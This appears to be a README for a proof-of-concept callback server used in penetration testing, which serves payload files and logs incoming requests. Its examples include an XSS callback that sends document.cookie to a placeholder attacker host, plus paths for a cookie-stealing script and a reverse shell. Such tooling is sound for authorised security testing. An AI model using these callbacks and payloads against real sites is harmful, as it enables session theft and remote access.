# POC Server

Single HTTP server that does everything you need for POC development.

## Features

- Serves files from `../payloads/` directory
- Logs ALL requests to `../logs/server.ndjson`
- CORS enabled for XSS testing
- Handles GET/POST/OPTIONS
- Minimal console output

## Usage

```bash
# Default: port 8000
python servers/server.py

# Custom port/bind
python servers/server.py -p 8080 -b 127.0.0.1
```

## Examples

### XSS Callback
```javascript
fetch('http://your-server:8000/xss?c=' + document.cookie)
```

### Blind Exploitation
```python
requests.get(f"http://your-server:8000/blind?id=test")
```

### Serve Payloads
Place files in `payloads/` and access at:
```
http://your-server:8000/xss/steal.js
http://your-server:8000/shells/reverse.py
```

### Check Logs
```bash
# Watch logs in real-time
tail -f logs/server.ndjson | jq .

# Search logs
grep "xss" logs/server.ndjson | jq .
```